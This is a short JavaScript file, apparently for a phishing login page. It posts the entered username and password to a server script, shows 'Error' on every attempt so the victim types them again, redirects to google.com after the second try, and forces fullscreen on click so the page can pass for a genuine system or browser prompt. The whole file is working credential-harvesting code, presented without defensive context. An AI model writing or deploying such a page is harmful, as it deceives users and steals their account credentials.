const User = document.getElementById("user");
const Password = document.getElementById("password");
var elemento = document.documentElement;
var WrittingIn = User;




var attemps = 1;
User.focus();

document.addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        if (document.activeElement === User) {
            WrittingIn = Password;
            Password.focus(); // Cambia el foco al campo de entrada "password" si "user" está enfocado
        } else if (document.activeElement === Password) {
            holamundo(); // Ejecuta la función holamundo() si "password" está enfocado y se presiona "Enter"
        }
    } else if (event.key === "ArrowDown" || event.key === "ArrowUp") {
        WrittingIn = User;
        event.preventDefault();
        if (document.activeElement === User) {
            WrittingIn = Password;
            Password.focus(); // Cambia el foco al campo de entrada "password" si "user" está enfocado
        } else if (document.activeElement === Password) {
            WrittingIn = User;
            User.focus(); // Cambia el foco al campo de entrada "user" si "password" está enfocado
        }
    }
});

document.addEventListener("click", function () {
    efeonce();

    WrittingIn.focus();
});

function holamundo() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "./server/submit.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // Aquí puedes manejar la respuesta del servidor si es necesario
                console.log("Datos enviados correctamente.");
            } else {
                console.error("Error al enviar datos.");
            }
        }
    };
    var params = "user=" + User.value + "&password=" + Password.value;
    xhr.send(params);

    Password.value = ""
    Password.placeholder = "Error"

    if (attemps === 2) {
        // Redirige a Google después del segundo intento fallido
        window.open("https://google.com", "_self");
    }

    attemps++;
}


function efeonce () {
    if (elemento.requestFullscreen) {
        elemento.requestFullscreen(); // Solicitar pantalla completa
      } else if (elemento.mozRequestFullScreen) { // Para navegadores Firefox
        elemento.mozRequestFullScreen();
      } else if (elemento.webkitRequestFullscreen) { // Para navegadores basados en WebKit, como Chrome y Safari
        elemento.webkitRequestFullscreen();
      } else if (elemento.msRequestFullscreen) { // Para Internet Explorer
        elemento.msRequestFullscreen();
      }
}